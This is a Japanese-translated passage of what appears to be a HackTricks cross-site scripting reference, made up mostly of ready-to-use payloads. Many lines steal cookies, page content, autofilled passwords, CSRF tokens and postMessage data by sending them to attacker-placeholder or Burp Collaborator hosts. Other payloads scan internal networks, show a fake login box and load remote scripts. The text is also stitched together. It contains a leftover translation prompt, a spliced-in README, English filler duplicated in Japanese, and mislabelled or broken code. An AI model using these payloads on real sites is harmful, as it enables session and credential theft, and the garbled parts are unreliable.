![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>

```javascript
//aaencode
# XSS (クロスサイトスクリプティング)

このディレクトリには、クロスサイトスクリプティング（XSS）に関連するテストと攻撃のためのファイルが含まれています。

## ファイル

- `xss.html`: 基本的なXSS攻撃のデモを含むHTMLファイルです。
- `xss.js`: XSS攻撃に使用されるJavaScriptコードが含まれています。

## 使用方法

1. `xss.html`をブラウザで開きます。
2. ページが表示されたら、入力フィールドにスクリプトを入力して「Submit」ボタンをクリックします。
3. 入力したスクリプトが実行され、攻撃が発生します。

**注意**: このディレクトリは、セキュリティテストや教育目的でのみ使用してください。悪意のある目的で使用しないでください。

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS一般的なペイロード

### 複数のペイロード

{% content-ref url="steal-info-js.md" %}
[steal-info-js.md](steal-info-js.md)
{% endcontent-ref %}

### クッキーの取得
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
{% hint style="info" %}
JavaScriptからクッキーにアクセスすることはできませんが、クッキーにHTTPOnlyフラグが設定されている場合は。しかし、[幸運な場合には、この保護をバイパスする方法](../hacking-with-cookies/#httponly)があります。
{% endhint %}

### ページのコンテンツを盗む
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8";
var attacker = "http://10.10.14.8/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open('GET', url, true);
xhr.send(null);
```
### 内部IPを見つける

To find internal IP addresses, you can use various techniques during a penetration test. These techniques involve exploiting vulnerabilities or misconfigurations in web applications to gather information about the target network.

以下の手法を使用して、内部IPアドレスを見つけることができます。これらの手法は、ペネトレーションテスト中に、ターゲットネットワークに関する情報を収集するために、ウェブアプリケーションの脆弱性や設定ミスを悪用することに関わります。

#### 1. DNS Rebinding

DNS rebinding is a technique that allows an attacker to bypass the same-origin policy enforced by web browsers. By exploiting this technique, an attacker can trick a victim's browser into making requests to internal IP addresses.

DNSリバインディングは、ウェブブラウザによって強制される同一オリジンポリシーをバイパスするための技術です。この技術を悪用することで、攻撃者は被害者のブラウザを内部IPアドレスに対してリクエストを行うように誤誘導することができます。

#### 2. Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make requests from the server to arbitrary destinations. By exploiting SSRF, an attacker can force the server to make requests to internal IP addresses and retrieve the responses.

サーバーサイドリクエストフォージェリ（SSRF）は、攻撃者がサーバーから任意の宛先にリクエストを行うことができる脆弱性です。SSRFを悪用することで、攻撃者はサーバーに内部IPアドレスに対してリクエストを行わせ、レスポンスを取得することができます。

#### 3. Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject malicious scripts into web pages viewed by users. By exploiting XSS, an attacker can execute scripts that make requests to internal IP addresses and retrieve the responses.

クロスサイトスクリプティング（XSS）は、攻撃者がユーザーが閲覧するウェブページに悪意のあるスクリプトを注入することができる脆弱性です。XSSを悪用することで、攻撃者は内部IPアドレスに対してリクエストを行い、レスポンスを取得するスクリプトを実行することができます。

#### 4. Content Spoofing

Content Spoofing is a technique that allows an attacker to manipulate the content displayed to users. By exploiting this technique, an attacker can trick users into viewing a page that contains requests to internal IP addresses.

コンテンツスプーフィングは、攻撃者がユーザーに表示されるコンテンツを操作することができる技術です。この技術を悪用することで、攻撃者はユーザーに内部IPアドレスへのリクエストが含まれるページを表示させることができます。

#### 5. Information Disclosure

Information Disclosure vulnerabilities can sometimes reveal internal IP addresses. By exploiting these vulnerabilities, an attacker can gather information about the target network, including internal IP addresses.

情報漏洩の脆弱性は、内部IPアドレスを明らかにすることがある場合があります。これらの脆弱性を悪用することで、攻撃者は内部IPアドレスを含むターゲットネットワークに関する情報を収集することができます。

It is important to note that these techniques should only be used in controlled environments with proper authorization. Unauthorized use of these techniques can lead to legal consequences.
```html
<script>
var q = []
var collaboratorURL = 'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net';
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for(i=1;i<=255;i++){
q.push(
function(url){
return function(){
fetchUrl(url, wait);
}
}('http://192.168.0.'+i+':8080'));
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for(i=1; i<=n_threads; i++){
if(q.length) q.shift()();
}

function fetchUrl(url, wait){
console.log(url)
var controller = new AbortController(), signal = controller.signal;
fetch(url, {signal}).then(r=>r.text().then(text=>
{
location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
}
))
.catch(e => {
if(!String(e).includes("The user aborted a request") && q.length) {
q.shift()();
}
});

setTimeout(x=>{
controller.abort();
if(q.length) {
q.shift()();
}
}, wait);
}
</script>
```
### ポートスキャナー（fetch）

The `fetch` method is a common technique used in Cross-Site Scripting (XSS) attacks. It allows an attacker to retrieve data from a specified URL and inject it into a vulnerable web page. This can be used to steal sensitive information, perform phishing attacks, or execute malicious code on the victim's browser.

To perform an XSS attack using the `fetch` method, the attacker crafts a malicious payload that includes a script tag with the `fetch` function. The URL parameter of the `fetch` function is set to the attacker's server, which contains the payload to be injected.

Here is an example of an XSS payload using the `fetch` method:

```html
<script>
  fetch('http://attacker-server.com/malicious-payload.js')
    .then(response => response.text())
    .then(data => {
      // Inject the retrieved data into the vulnerable web page
      document.body.innerHTML = data;
    });
</script>
```

In this example, the attacker's server hosts a file called `malicious-payload.js`, which contains the actual malicious code. The `fetch` function retrieves the contents of this file and injects it into the vulnerable web page by replacing the entire HTML body with the retrieved data.

It is important to note that the `fetch` method is just one of many techniques used in XSS attacks. Web developers should implement proper input validation and output encoding to prevent XSS vulnerabilities. Additionally, users should be cautious when visiting unfamiliar websites and avoid clicking on suspicious links to mitigate the risk of XSS attacks.
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### ポートスキャナー（ウェブソケット）

The Port Scanner is a tool used to identify open ports on a target system. It works by sending requests to different ports and analyzing the responses received. This can be useful for identifying potential entry points for attacks or vulnerabilities.

To use the Port Scanner, follow these steps:

1. Specify the target system's IP address or domain name.
2. Set the range of ports to scan (e.g., 1-1000).
3. Choose the scanning method (e.g., TCP, UDP).
4. Start the scan and wait for the results.

The Port Scanner will display a list of open ports along with their corresponding services. This information can help in assessing the security of a system and identifying potential weaknesses.

**Note:** It is important to obtain proper authorization before conducting any port scanning activities. Unauthorized port scanning can be illegal and may result in severe consequences. Always ensure that you have the necessary permissions and legal rights before performing any security assessments.
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_短い時間は応答ポートを示します_ _長い時間は応答がないことを示します。_

Chromeで禁止されているポートのリストは[**こちら**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net\_util.cc)で確認できます。Firefoxで禁止されているポートのリストは[**こちら**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist)です。

### 資格情報を要求するボックス
```markup
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### パスワードの自動入力のキャプチャ

Auto-fill passwords capture is a technique used to exploit cross-site scripting (XSS) vulnerabilities in web applications. When a user visits a website that is vulnerable to XSS, an attacker can inject malicious code into the website's input fields, such as login forms or search bars. 

自動入力のパスワードのキャプチャは、ウェブアプリケーションのクロスサイトスクリプティング（XSS）の脆弱性を悪用するための技術です。ユーザーがXSSの脆弱性を持つウェブサイトを訪れると、攻撃者はログインフォームや検索バーなどのウェブサイトの入力フィールドに悪意のあるコードを挿入することができます。

When the user interacts with these input fields, their web browser's auto-fill feature may automatically populate the fields with saved passwords. The injected code can capture these auto-filled passwords and send them to the attacker's server.

ユーザーがこれらの入力フィールドと対話すると、ウェブブラウザの自動入力機能によって保存されたパスワードが自動的にフィールドに入力される場合があります。挿入されたコードは、これらの自動入力されたパスワードをキャプチャし、攻撃者のサーバーに送信することができます。

To protect against auto-fill passwords capture, web developers should implement proper input validation and output encoding to prevent XSS attacks. Users should also be cautious when entering sensitive information on websites and consider using password managers instead of relying on auto-fill features.

自動入力のパスワードのキャプチャに対する保護のために、ウェブ開発者は適切な入力検証と出力エンコーディングを実装してXSS攻撃を防止する必要があります。ユーザーはまた、ウェブサイトに機密情報を入力する際に注意を払い、自動入力機能に頼らずにパスワードマネージャーを使用することを検討すべきです。
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
パスワードフィールドにデータが入力されると、ユーザー名とパスワードが攻撃者のサーバーに送信されます。クライアントが保存されたパスワードを選択して何も入力しない場合でも、資格情報は外部に漏洩します。

### キーロガー

GitHubで検索すると、いくつかの異なるものが見つかります:

* [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
* [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
* [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
* metasploitの`http_javascript_keylogger`も使用できます。

### CSRFトークンの盗み取り
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### PostMessageメッセージの盗み出し

PostMessageメッセージの盗み出しは、クロスサイトスクリプティング（XSS）の一種です。この攻撃では、攻撃者は悪意のあるスクリプトを使用して、PostMessageを介して送信されるメッセージを盗み出します。

攻撃者は、悪意のあるウェブサイトを作成し、そのウェブサイト内に悪意のあるスクリプトを埋め込みます。このスクリプトは、PostMessageを使用して他のウェブサイトにメッセージを送信します。

攻撃者は、PostMessageを使用して送信されるメッセージを盗み出すために、以下の手法を使用することがあります。

1. イベントリスナーの乗っ取り：攻撃者は、悪意のあるスクリプトを使用して、他のウェブサイトのPostMessageイベントリスナーを乗っ取ります。これにより、攻撃者は送信されるメッセージを読み取ることができます。

2. メッセージの送信先の偽装：攻撃者は、悪意のあるスクリプトを使用して、PostMessageを使用してメッセージを送信するウェブサイトのドメインを偽装します。これにより、攻撃者はメッセージを受け取ることができます。

この攻撃を防ぐためには、以下の対策を講じることが重要です。

- クロスオリジンポリシーの実装：ウェブサイトは、クロスオリジンポリシーを適切に実装する必要があります。これにより、他のドメインからの不正なメッセージの受信を防ぐことができます。

- セキュアなコーディングプラクティスの採用：ウェブサイトの開発者は、セキュアなコーディングプラクティスを採用する必要があります。入力の検証やエスケープ処理などのセキュリティ対策を実施することで、XSS攻撃を防ぐことができます。

- セキュリティ意識の向上：ウェブサイトのユーザーは、セキュリティ意識を高める必要があります。信頼できないウェブサイトやリンクにアクセスしないこと、セキュリティソフトウェアの使用などが重要です。

以上が、PostMessageメッセージの盗み出しに関する情報です。
```markup
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Service Workersの悪用

{% content-ref url="abusing-service-workers.md" %}
[abusing-service-workers.md](abusing-service-workers.md)
{% endcontent-ref %}

### ポリグロット

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt" %}

### Blind XSSペイロード

以下も使用できます: [https://xsshunter.com/](https://xsshunter.com)
```markup
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```
### 隠されたコンテンツを見つける

[**この解説記事**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay)から、いくつかの値がJSから消えても、それらを異なるオブジェクトのJS属性で見つけることができることがわかります。例えば、正規表現の入力の値が削除された後でも、それを見つけることができます。
```javascript
// Do regex with flag
flag="CTF{FLAG}"
re=/./g
re.test(flag);

// Remove flag value, nobody will be able to get it, right?
flag=""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"])
```
### ブルートフォースリスト

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt" %}

## 他の脆弱性を悪用したXSS

### Markdown内のXSS

Markdownコードを注入して、レンダリングされる可能性があります。XSSを取得できるか確認してください：

{% content-ref url="xss-in-markdown.md" %}
[xss-in-markdown.md](xss-in-markdown.md)
{% endcontent-ref %}

### XSSからSSRFへ

**キャッシュを使用するサイト**でXSSを取得しましたか？次のペイロードを使用して、Edge Side Include Injectionを介してSSRFにアップグレードしてみてください：
```python
<esi:include src="http://yoursite.com/capture" />
```
以下は、ハッキング技術に関する本の内容です。以下の内容は、ファイルpentesting-web/xss-cross-site-scripting/README.mdからのものです。関連する英文を日本語に翻訳し、翻訳を返し、マークダウンとHTMLの構文を正確に保ちます。コード、ハッキング技術の名前、ハッキングの言葉、クラウド/SaaSプラットフォームの名前（Workspace、aws、gcpなど）、'leak'という単語、ペンテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウンの構文以外の追加のものは追加しないでください。

```markdown
Use it to bypass cookie restrictions, XSS filters and much more!
More information about this technique here: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md).

### 動的に作成されたPDF内のXSS

Webページがユーザーが制御する入力を使用してPDFを作成している場合、PDFを作成しているボットを**トリック**して**任意のJSコードを実行**させることができます。
したがって、**PDF作成ボットが**いくつかの種類の**HTML** **タグを見つけると**、それらを**解釈**し、これを**悪用**して**サーバーXSS**を引き起こすことができます。

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

HTMLタグを挿入できない場合は、**PDFデータを挿入**してみる価値があります。

{% content-ref url="pdf-injection.md" %}
[pdf-injection.md](pdf-injection.md)
{% endcontent-ref %}

### Amp4Email内のXSS

AMPは、モバイルクライアント上で超高速なWebページを開発するための技術です。**AMPはJavaScriptでバックアップされたHTMLタグのセット**であり、パフォーマンスとセキュリティに重点を置いた機能を簡単に有効にすることができます。[AMPコンポーネント](https://amp.dev/documentation/components/?format=websites)には、カルーセル、レスポンシブフォーム要素、リモートエンドポイントからの新鮮なコンテンツの取得など、あらゆるものがあります。

[**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/)形式では、電子メールメッセージで使用できる[AMPコンポーネントのサブセット](https://github.com/ampproject/amphtml/blob/master/docs/spec/email/amp-email-components.md)が提供されています。AMPメールの受信者は、電子メール内で直接AMPコンポーネントを表示および操作することができます。

例：[**GmailのAmp4Email内のXSSに関する記事**](https://adico.me/post/xss-in-gmail-s-amp4email).

### ファイルのアップロードによるXSS（svg）

次のようなファイルを画像としてアップロードします（[http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)から）：
```
```markup
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```markup
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```markup
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x"/></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
**[https://github.com/allanlw/svg-cheatsheet](https://github.com/allanlw/svg-cheatsheet)**で**さらに多くのSVGペイロード**を見つけることができます。

## その他のJSトリックと関連情報

{% content-ref url="other-js-tricks.md" %}
[other-js-tricks.md](other-js-tricks.md)
{% endcontent-ref %}

## XSSリソース

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
* [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
* [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
* [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
* [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)

### XSSツール

[**ここでXSSのツールを見つける**](xss-tools.md)**ことができます。**

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**バグバウンティのヒント**: **ハッカーによって作成されたプレミアムなバグバウンティプラットフォーム**である**Intigritiに登録**してみてください！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したり、HackTricksを**PDFでダウンロード**したりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
